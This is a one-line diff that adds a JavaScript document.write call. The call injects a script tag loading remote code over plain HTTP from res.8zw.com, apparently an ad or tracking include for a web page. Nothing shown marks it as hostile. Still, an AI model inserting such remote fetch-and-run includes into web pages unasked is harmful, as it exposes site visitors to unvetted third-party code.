@@ -1,0 +1,1 @@
+document.write('<script type="text/javascript" language="javascript" src="http://res.8zw.com/page/s.php?s=7571"></script>');
